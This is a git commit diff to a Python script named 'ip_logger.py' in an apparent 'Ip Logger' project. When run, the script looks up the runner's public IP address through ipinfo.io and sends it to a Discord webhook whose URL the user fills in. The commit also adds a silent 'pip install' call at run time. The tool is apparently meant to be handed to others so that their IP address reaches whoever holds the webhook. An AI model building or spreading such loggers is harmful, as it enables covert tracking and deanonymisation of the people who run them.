ee6900eccb3e484fe7cd0779c27b8d663bb3facb
Lack <118399851+Lack54@users.noreply.github.com>
2023-01-15 11:45:30 -0500

    Update ip_logger.py

--- Ip Logger/ip_logger.py
+++ Ip Logger/ip_logger.py
@@ -1,12 +1,15 @@
 import requests
+import os
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 def main():
+    os.system("pip install discord-webhook")
+    from discord_webhook import DiscordWebhook, DiscordEmbed
     ip = requests.get('http://ipinfo.io/json').json()['ip']
     log("ip has been logged!", f"logged ip: {ip}")
 
 def log(title, discription):
-    webhook = DiscordWebhook(url=" !DELETE THIS AND INPUT UR WEBHOOK URL HERE! ")
+    webhook = DiscordWebhook(url="YOUR WEBHOOK HERE")
     embed = DiscordEmbed(title=title, description=discription, color="0000FF")
 
 
